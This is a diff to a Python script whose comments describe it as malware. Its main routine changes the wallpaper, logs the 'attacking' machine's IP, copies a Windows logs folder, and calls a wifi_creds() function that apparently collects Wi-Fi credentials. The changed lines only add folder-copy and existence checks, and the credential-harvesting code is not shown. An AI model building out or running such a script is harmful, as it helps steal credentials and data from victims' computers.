@@ -28,11 +28,21 @@ def ip_address():
     print("Your attacking Computer IP Address is:" + IPAddr, file=f)
     f.close()    
 
+#copies folder
+def copy_folder(source,target):
+    if os.path.isdir(target):
+        print("Folder Exists")
+    else:
+        shutil.copytree(source, target)
+        print("Folder Copied")
+
 #copies files
-#need to include logic to check if file already exists
 def copy_file(source,target):
-    shutil.copytree(source, target)
-    print("files copied")
+    if os.path.isfile(target):
+        print("Files Exists")
+    else:
+        shutil.copytree(source, target)
+        print("Files Copied")
     
 #creates directory to store malware data
 def dir_create():
@@ -99,7 +109,7 @@ def main():
     background()
     print("Wallpaper successfully applied")
     ip_address()
-    copy_file("C:/WindowsLogs/","C:/test/")
+    copy_folder("C:/WindowsLogs/","C:/test/")
     wifi_creds()
     
     
